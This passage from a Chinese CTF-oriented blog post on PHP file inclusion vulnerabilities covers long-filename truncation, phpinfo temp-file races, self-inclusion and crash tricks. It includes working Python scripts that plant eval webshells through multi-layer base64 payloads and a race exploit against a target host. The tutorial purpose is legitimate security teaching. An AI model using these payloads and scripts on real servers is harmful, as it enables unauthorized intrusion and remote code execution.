+	<span class="nv">$ss</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
+	<span class="nv">$ss_length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;|[^a-z0-9A-Z+/]|s&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$ss</span><span class="p">));</span>
+	<span class="nv">$sss</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$ss</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="nv">$s_length</span><span class="o">%</span><span class="mi">4</span><span class="o">==</span><span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$ss_length</span><span class="o">%</span><span class="mi">4</span><span class="o">==</span><span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$sss</span><span class="o">==</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">echo</span> <span class="nv">$data</span><span class="p">;</span>
+		<span class="k">break</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>对于后面的 php 代码，也有一个要求，就是三次解密中都不能出现 <code>=</code>，因为base64中 <code>=</code> 只能放在编码的最后补位，出现在中间的话，<code>php://filter/convert.base64-decode </code>流就无法正常解析，就会报错。</p>
+<p>对此 oragne 师傅写了个脚本生成这玩意：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
+<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">sample</span><span class="p">,</span> <span class="n">randint</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;@&lt;?php file_put_contents(&#39;/tmp/web&#39;, &#39;@&lt;?php eval($_GET[1])?&gt;&#39;); ?&gt;&#34;</span>
+
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">junk</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">sample</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">,</span> <span class="n">randint</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">16</span><span class="p">)))</span>
+    <span class="n">x</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="n">junk</span><span class="p">)</span>
+    <span class="n">xx</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="n">junk</span><span class="p">))</span>
+    <span class="n">xxx</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">b64encode</span><span class="p">(</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="n">junk</span><span class="p">)))</span>
+    <span class="k">if</span> <span class="s1">&#39;=&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">x</span> <span class="ow">and</span> <span class="s1">&#39;=&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">xx</span> <span class="ow">and</span> <span class="s1">&#39;=&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">xxx</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">xxx</span><span class="p">)</span>
+        <span class="k">break</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>VVVSM0wyTkhhSGRKUjFwd1lrZFdabU5JVmpCWU1rNTJZbTVTYkdKdVVucExRMk4yWkVjeGQwd3paR3haYVdOelNVTmtRVkJFT1hkaFNFRm5XbGhhYUdKRFoydFlNR1JHVmtaemVGaFRheTlRYVdOd1QzbEJMMUJzVGxGVmEwNUZWbXh3YTFSRk5UTmlNMHB6</p>
+<h3 id="46--长文件名截断">4.6 ./ 长文件名截断</h3>
+<p>payload:?page=phpinfo.txt&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;..
+或page=phpinfo.txt././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</p>
+<h3 id="47-phpinfo">4.7 phpinfo</h3>
+<p>向服务器上任意 php 文件以 form-data 式提交请求上传数据时，会生成临时文件，通过 phpinfo 来获取临时文件的路径以及名称，然后临时文件在极短时间被删除的时候，需要竞争时间包含临时文件拿到 webshell</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190113173316.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190113173316.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190113173316.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190113173316.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190113173316.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190113173316.png-water_print" /></p>
+<p><a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py" target="_blank" rel="noopener noreffer">https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py</a></p>
+<h3 id="48-php-自包含">4.8 PHP 自包含</h3>
+<ul>
+<li>上传 -&gt; 临时文件</li>
+<li>会话结束 -&gt; 删除临时文件</li>
+<li>phpinfo() -&gt; 临时文件名</li>
+<li>中断删除的过程
+/a.php?include=a.php
+这样 a.php 会将它自身包含进来，而被包含进来的 a.php 再次尝试处理 url 的包含请求时，再次将自己包含进来，形成了无穷递归，递归会导致爆栈，使php无法进行此次请求的后续处理，然后就能进行包含了</li>
+<li>自包含，导致 php 停止</li>
+</ul>
+<p>demo：</p>
+<p>「百度杯」CTF比赛 十二月场 - Blog 进阶版</p>
+<ul>
+<li>注册账号，POST 页面存在 insert 型 SQL 注入获取管理员账号</li>
+<li>登录 admin 账号，发现 manage 页面下存在包含</li>
+<li>利用自包含漏洞，在 tmp 文件夹下上传 webshell</li>
+</ul>
+<h3 id="49-php-崩溃">4.9 PHP 崩溃</h3>
+<p>本地文件包含漏洞可以让 php 包含自身从而导致死循环然后 php 就会崩溃，如果请求中同时存在一个上传文件的请求的话,这个文件就会被保留</p>
+<p><code>include.php?file=php://filter/string.strip_tags/resource=/etc/passwd</code></p>
+<ul>
+<li>include.php?file=php://filter/string.strip_tags/resource=/etc/passwd</li>
+</ul>
+<p>可以导致 php 在执行过程中 Segment Fault
+想到可以利用在本地文件包含漏洞中
+之前在网上的分析文章中，本地文件包含漏洞可以让 php 包含自身从而导致死循环
+然后 php 就会崩溃 , 如果请求中同时存在一个上传文件的请求的话，这个文件就会被保留</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding: utf-8 -*-</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">itertools</span>
+<span class="n">charset</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">letters</span>
+<span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;192.168.43.155&#34;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
+<span class="n">base_url</span> <span class="o">=</span> <span class="s2">&#34;http://</span><span class="si">%s</span><span class="s2">:</span><span class="si">%d</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">upload_file_to_include</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">file_content</span><span class="p">):</span>
+    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;evil.jpg&#39;</span><span class="p">,</span> <span class="n">file_content</span><span class="p">,</span> <span class="s1">&#39;image/jpeg&#39;</span><span class="p">)}</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="n">e</span>
+<span class="k">def</span> <span class="nf">generate_tmp_files</span><span class="p">():</span>
+    <span class="n">webshell_content</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php eval($_REQUEST[c]);?&gt;&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span>
+        <span class="s2">&#34;base64&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;base64&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;base64&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="n">file_content</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php if(file_put_contents(&#34;/tmp/ssh_session_HD89q2&#34;, base64_decode(&#34;</span><span class="si">%s</span><span class="s1">&#34;))){echo &#34;flag&#34;;}?&gt;&#39;</span> <span class="o">%</span> <span class="p">(</span>
+        <span class="n">webshell_content</span><span class="p">)</span>
+    <span class="n">phpinfo_url</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%s</span><span class="s2">/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd&#34;</span> <span class="o">%</span> <span class="p">(</span>
+        <span class="n">base_url</span><span class="p">)</span>
+    <span class="n">length</span> <span class="o">=</span> <span class="mi">6</span>
+    <span class="n">times</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">charset</span><span class="p">)</span> <span class="o">**</span> <span class="p">(</span><span class="n">length</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="n">times</span><span class="p">):</span>
+        <span class="nb">print</span> <span class="s2">&#34;[+] </span><span class="si">%d</span><span class="s2"> / </span><span class="si">%d</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">times</span><span class="p">)</span>
+        <span class="n">upload_file_to_include</span><span class="p">(</span><span class="n">phpinfo_url</span><span class="p">,</span> <span class="n">file_content</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">generate_tmp_files</span><span class="p">()</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="5-总结">5 总结</h2>
+<p>当一个目标存在任意文件包含漏洞的时候，但找不到可以包含的文件，无法 getshell。可以有三种方法：</p>
+<ol>
+<li>借用 phpinfo，包含临时文件来 getshell</li>
+<li>利用 PHP_SESSION_UPLOAD_PROGRESS，包含 session 文件来 getshell</li>
+<li>利用一个可以使 PHP 挂掉的漏洞（如内存漏洞等），使 PHP 停止执行，此时上传的临时文件就没有删除。我们可以爆破缓存文件名来 getshell。</li>
+</ol>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2019-05-30</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" data-title="PHP 文件包含漏洞"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" data-title="PHP 文件包含漏洞"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" data-title="PHP 文件包含漏洞"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E5%B8%B8%E7%94%A8/">常用</a>,&nbsp;<a href="/tags/ctf/">CTF</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="prev" rel="prev" title="MS14-068 漏洞分析"><i class="fas fa-angle-left fa-fw"></i>MS14-068 漏洞分析</a>
+            <a href="/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="next" rel="next" title="CTF 中的命令执行漏洞">CTF 中的命令执行漏洞<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
